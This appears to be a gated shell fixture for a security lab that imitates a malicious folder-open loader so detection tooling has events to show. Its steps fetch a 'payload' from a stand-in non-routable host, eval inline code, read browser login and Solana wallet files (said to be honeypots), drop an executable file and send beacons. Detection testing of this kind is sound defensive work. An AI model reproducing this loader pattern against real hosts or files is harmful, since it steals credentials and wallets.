#!/bin/sh
# Observability demo loader: the shape of a folder-open task loader (detach, fetch, inline
# eval, browser/wallet data reads, a dropped host-executable file, a regular beacon), so the
# tab's event stream has something to show. Nothing here can succeed or harm a host.
#
# Fixture safety (AGENTS.md; EDR fixture-safety): inert unless armed by a harness run
# (.seclab/targets with a per-run nonce, this workspace inside that run's dir, unexpired).
# Network only to RFC 5737 192.0.2.10 (non-routable). Reads only the tab's honeypots under
# /home/agent (seeded by the tab's collector or the harness; absent on a macOS host). Writes
# one marker (the dropped .envrc) inside the run dir.
HERE="$(cd "$(dirname "$0")/.." && pwd)"
TARGETS="$HERE/.seclab/targets"
get() { sed -n "s/^$1=//p" "$TARGETS" 2>/dev/null | head -1; }
ARM="$(get arm)"
RUN="$(get run)"
UNTIL="$(get until)"
MARKER="$(get marker)"
printf '%s' "$ARM" | grep -qE '^[0-9a-f]{32}$' || exit 0
case "$RUN" in /?*) ;; *) exit 0 ;; esac
case "$HERE/" in "$RUN"/*) ;; *) exit 0 ;; esac
case "$UNTIL" in ''|*[!0-9]*) exit 0 ;; esac
[ "$(date +%s)" -lt "$UNTIL" ] || exit 0
case "$MARKER" in *'/..'*|*'../'*) exit 0 ;; "$HERE"/.envrc) ;; *) exit 0 ;; esac

# 1. Detach from the task, fetch a "payload" and evaluate inline code (fetch goes nowhere).
#    The OCI tab image has no node on PATH; the REH's own node is in every tab.
NODE="$(command -v node || echo /opt/seclab-reh/node)"
nohup sh -c "curl --noproxy '*' -s -m 1 -o /dev/null http://192.0.2.10/payload; $NODE -e 'eval(String(1))'" >/dev/null 2>&1 &

# 2. Browser and wallet data, the loader's real target (honeypots in the tab).
for f in "/home/agent/.config/google-chrome/Default/Login Data" /home/agent/.config/solana/id.json; do
	cat "$f" >/dev/null 2>&1
done

# 3. Drop a host-executable file (the run's single marker).
printf '# seclab observability marker %s\n' "$ARM" > "$MARKER"
chmod +x "$MARKER"

# 4. Beacon: four attempts, 1.5 s apart.
i=0
while [ "$i" -lt 4 ]; do
	curl --noproxy "*" -s -m 1 -o /dev/null http://192.0.2.10/beacon
	i=$((i + 1))
	sleep 1.5
done
wait
